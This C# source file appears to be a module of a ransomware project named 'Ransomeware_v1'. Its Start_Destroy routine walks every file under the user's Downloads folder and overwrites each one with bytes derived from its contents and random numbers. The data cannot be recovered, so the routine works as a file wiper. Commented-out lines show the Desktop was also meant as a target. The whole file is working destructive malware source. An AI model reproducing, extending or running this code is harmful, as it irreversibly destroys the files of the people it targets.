using System;

using System.IO;

namespace Ransomeware_v1.Modules
{
    class Destruction
    {
        static public string[] List_file(string root)
        {
            return Directory.GetFiles(root);
        }
        public class DestroyFile
        {
            public void DestroyFiles(string file)
            {
                try
                {
                    byte[] bytesDestroyed = File.ReadAllBytes(file); //*
                    FileInfo fi = new FileInfo(file);
                    long size = fi.Length;
                    byte[] bytes = new byte[size];
                    Random random = new Random();
                    for (int i=0; i<size; i++) 
                        bytes[i] = (byte)((random.Next(6478324) + bytesDestroyed[i]) % 255); //*
                    File.WriteAllBytes(file, bytes);
                }
                catch
                {
                    Console.WriteLine("Can't access " + file);
                }
            }
        }

        static public void Start_Destroy() //We see start destroy files on desktop and download folder
        {
            //string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");
            //string[] files = Directory.GetFiles(path + @"\", "*", SearchOption.AllDirectories);
            string[] files2 = Directory.GetFiles(downloadFolder + @"\", "*", SearchOption.AllDirectories);



            DestroyFile enc = new DestroyFile();


            //for (int i = 0; i < files.Length; i++)
            //{
            //    enc.EncryptFile(files[i]);
            //    //Console.WriteLine(files[i]);
            //}

            for (int i = 0; i < files2.Length; i++)
            {
                enc.DestroyFiles(files2[i]);
                //Console.WriteLine(files[i]);
            }
        }
       
      
    }

}
